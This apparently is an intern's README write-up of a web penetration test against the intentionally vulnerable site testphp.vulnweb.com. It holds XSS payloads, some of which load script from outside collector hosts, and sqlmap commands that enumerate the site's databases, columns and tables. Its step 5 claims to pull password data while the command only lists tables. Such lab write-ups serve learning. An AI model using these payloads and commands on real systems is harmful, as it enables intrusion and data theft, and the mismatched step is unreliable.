# CODTECH-Task2


# WEB APPLICATION PENETRATION TESTING
# Personal information

* Name : Patel Mihir

* Company : CODTECH IT SOLUTIONS PVT.LTD

* ID : CT08DAB

* Domain : Cyber Security & Ethical Hacking

* Duration: 20th Dec 2024 To 20th Jan 2025

* Mentor : Neela Santhosh kumar

# Overview

* Web Application Penetration Testing involves identifying and exploiting security vulnerabilities in web applications to ensure they are secure against potential attacks. This process focuses on vulnerabilities like SQL injection, cross-site scripting (XSS), and insecure authentication mechanisms.

# objective

1. Identify vulnerabilities
2. Exploit weaknesses to understand potential attacks
3. Recommend remediation to enhance security

# Tools used in web application Testing

- sqlmap
- burpsuite
- nmap
- nikto
- dirb
- owasp zap
- Metasploit Framework
- nessus etc.

# focus vulnerabilities

- cross site scripting (XSS)
- SQL injection
- insecure authentication
- open redirect etc.

# Performed Task
# Details of site where we performed the web application Testing

- Site Name : http://testphp.vulnweb.com
- IP address : 44.228.249.3
- Web server : HTTPServer[nginx/1.19.0]
- technology used : 1. PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1] , 2. Script[text/JavaScript]
- Port : 80 [http] open

# Performed Testing on testphp.vulnweb.com

# 1. XSS Vulnerability

step 1 : Now first open the site and write xss payload on serachbar.

    <script>alert("XSS vulnerability found")</script>  
<br> 

    <script>alert(1)</script>    
<br> 

    <script>alert(document.domain.concat("\n").concat(window.origin))</script>    
<br> 

    <img src=x onerror=alert('XSS');>    
<br>  

    "><script src="https://js.rip/<custom.name>"></script>

    "><script src=//<custom.subdomain>.xss.ht></script> 

    <script>$.getScript("//<custom.subdomain>.xss.ht")</script>     

![image](https://github.com/user-attachments/assets/3196a105-0b45-4963-9c20-964b324cb7e7)

![image](https://github.com/user-attachments/assets/52485633-8a3b-4ff2-b6ca-455f0804bc6c)

![image](https://github.com/user-attachments/assets/edee616c-72a9-4a6a-a87c-cdcf1d43a1e8)

![image](https://github.com/user-attachments/assets/7a17a8b9-9223-458f-808d-fc390f367078)

![image](https://github.com/user-attachments/assets/a5345045-a1b2-43e3-8e66-3bf25e328491)

![image](https://github.com/user-attachments/assets/9cf9efb3-c86c-41a2-91a9-328191760fa5)

![image](https://github.com/user-attachments/assets/604a7f82-1248-4790-a447-d610428a1a0f)


# 2. Sql injection

![image](https://github.com/user-attachments/assets/15ec2865-08b6-45b5-9040-0d5aded164d7)

we use payload in url and it shows sql error
![image](https://github.com/user-attachments/assets/3a5b5c1a-ddaf-49b6-bc5f-8dd2e4be2483)

![image](https://github.com/user-attachments/assets/ca73eda4-9ef8-40b8-8905-5d8e303efc3f)

- Step 2 : copy The given url.

        http://testphp.vulnweb.com/listproducts.php?cat=1
  <br> 
- Step 3 : open the kali linux terminal.
- Now write the given command for perform SQL injection.

- here -u refers for URL & --dbs for database.

        sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs

![image](https://github.com/user-attachments/assets/3da4323e-77d5-4523-9bdf-5ba7c1a26246)

- Now you see that we got a two databases. first is acuart and second is information_schema.

- Now we go to the inner in acuart database.

- Step 4 : Now follow this commnd for find columns in acuart database.

        sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --columns


![image](https://github.com/user-attachments/assets/76aa812d-5f24-43fb-b485-bc0e702c659d)

![image](https://github.com/user-attachments/assets/e671b246-b914-41ed-a008-055e9905e180)

![image](https://github.com/user-attachments/assets/b6c52111-9168-4915-bab8-b9f677de7f7b)

- Now you see we got columns of databases.

- step 5 : Retrieve data from the pass column using the following command.

        sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables
![image](https://github.com/user-attachments/assets/7dd547da-39aa-491d-934a-a02722d55e1b)

